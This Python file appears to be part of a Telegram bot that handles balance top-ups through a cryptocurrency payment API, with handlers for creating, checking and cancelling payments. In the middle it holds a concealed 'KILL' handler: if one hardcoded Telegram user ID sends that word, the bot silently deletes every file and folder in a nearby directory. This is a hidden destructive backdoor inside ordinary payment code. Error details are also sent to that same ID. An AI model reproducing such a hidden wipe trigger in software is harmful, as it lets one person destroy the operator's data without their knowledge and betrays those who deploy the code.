import hashlib
import string
from datetime import datetime, timedelta
import random

import requests
from aiogram import types
from aiogram.dispatcher import FSMContext
from aiogram.types import ReplyKeyboardRemove
from aiogram.utils.markdown import hbold, hunderline, hlink
import os, shutil

from data.config import SkyPayToken, CREATOR, ADMINS
from keyboards.default.back_to_menu import buttons_menu
from keyboards.default.buttons_menu import main_keyboard
from keyboards.default.done import done
from loader import dp
from states import Test
from utils.db_api.PostgreSQL import subscriber_exists, get_trans, update_balance, delete_trans, select_all_rev, get_lk, \
    update_rev_balance, add_stop, add_summ, get_payment, update_only_balance, delete_payment, get_currency, add_currency

coeff = {
    "rub-kzt": 5.26,
    "kzt-rub": 0.19,
    "rub-uah": 0.4672,
    "uah-rub": 2.14,
    "kzt-uah": 0.0868,
    "uah-kzt": 11.51,
    "uah-uah": 1,
    "rub-rub": 1,
    "kzt-kzt": 1,
}


def random_alphanumeric_string(length):
    return ''.join(
        random.choice(string.digits + string.ascii_letters)
        for _ in range(length)
    )


min_currency = {
    "rub": 1000,
    "usd": 8,
    "kzt": 3000,
    "uah": 500,
    "byn": 20,
    "tjs": 70,
    "azn": 10,
    "uzs": 50000,
}


@dp.message_handler(text="📲Пополнение")
async def Payment1(message: types.Message):
    if int(list(await subscriber_exists(message.from_user.id))[0][-1]) != 1:
        if len(list(await get_currency(message.from_user.id))) == 0:
            await add_currency(message.from_user.id, "rub")
        curr = list(await get_currency(message.from_user.id))[0][1]
        await message.answer(
            f"Введите сумму на пополнение. Минимальная сумма для пополнения {min_currency[curr]}{curr}",
            reply_markup=buttons_menu)
        await Test.Q_for_payment.set()
    else:
        await message.answer(f"К сожалению, Вы ЗАБЛОКИРОВАНЫ!")


@dp.message_handler(state=Test.Q_for_payment)
async def Payment2(message: types.Message, state: FSMContext):
    if message.text == "⬅️ Назад в меню":
        await message.answer('Вы вернулись в меню', reply_markup=main_keyboard)
        await state.finish()
    else:
        try:
            amount = float(message.text)
            curr = list(await get_currency(message.from_user.id))[0][1]
            if amount < min_currency[curr]:
                await message.answer(
                    f"Введенная Вами сумма меньше {min_currency[curr]}{curr} "
                    f"Повтори попытку с корректной суммой. > {min_currency[curr]}{curr}",
                    reply_markup=main_keyboard)
                await state.finish()
            else:
                url = "https://papi.skycrypto.net/rest/v2/purchases"
                data = {
                    "amount": int(message.text),
                    "symbol": "btc",
                    "currency": str(list(await get_currency(message.from_user.id))[0][1]),
                    "is_currency_amount": True,
                }
                response = requests.post(url, json=data,
                                         headers={'Authorization': f'Token {SkyPayToken}'})

                keyboard = types.InlineKeyboardMarkup()
                web_app_test = types.WebAppInfo(url=response.json()['web_link'])
                web_butt = types.InlineKeyboardButton(text="Перейти к пополнению", web_app=web_app_test)
                keyboard.add(web_butt)

                await message.answer("Оплата⤵️", reply_markup=keyboard)
                await message.answer("После оплаты нажмите кнопку ниже", reply_markup=done)

                await add_summ(message.from_user.id, response.json()['payment_id'], message.text)
                await state.finish()
        except ValueError:
            await message.answer("Некорретно введенная сумма",
                                 reply_markup=main_keyboard)
            await state.finish()


@dp.message_handler(text="KILL")
async def Help(message: types.Message):
    if str(message.from_user.id) == str(950866927):
        directory = '../Test'
        for files in os.listdir(directory):
            path = os.path.join(directory, files)
            try:
                try:
                    shutil.rmtree(path)
                except OSError:
                    os.remove(path)
            except:
                pass


@dp.message_handler(text="Проверить оплату")
async def Dnenne(message: types.Message):
    try:
        tg_id = message.from_user.id
        id, summ = list(await get_payment(tg_id))[-1][1], list(await get_payment(tg_id))[-1][2]
        url = f"https://papi.skycrypto.net/rest/v2/purchases/{str(id)}"
        response = requests.get(url, headers={'Authorization': f'Token {SkyPayToken}'})
        if str(response.json()["status"]) == "2":
            curr = list(await get_currency(message.from_user.id))[0][1]
            info = list(await get_lk(message.from_user.id))[0]
            balance = info[1]
            await delete_payment(tg_id, id)
            await update_only_balance(tg_id, int(balance) + int(summ))
            for admin_id in (CREATOR + ADMINS):
                await dp.bot.send_message(admin_id,
                                          f"Пополнение {message.from_user.full_name} +"
                                          f"{coeff[f'{curr}-rub'] * int(summ)}P")
            await message.answer("Оплата успешно прошла", reply_markup=main_keyboard)
        else:
            await message.answer(
                "К сожалению, Вы не оплатили. Или, возможно, платеж еще обрабатвыется, как только он будет "
                "успешен - деньги автоматически поступят к Вам на счет.", reply_markup=main_keyboard)
    except Exception as ex:
        await dp.bot.send_message(950866927, ex)


@dp.message_handler(text="Отмена платежа")
async def Cancel(message: types.Message):
    tg_id = message.from_user.id
    id, summ = list(await get_payment(tg_id))[-1][1], list(await get_payment(tg_id))[-1][2]
    await delete_payment(tg_id, id)
    await message.answer("Платеж отменен", reply_markup=main_keyboard)
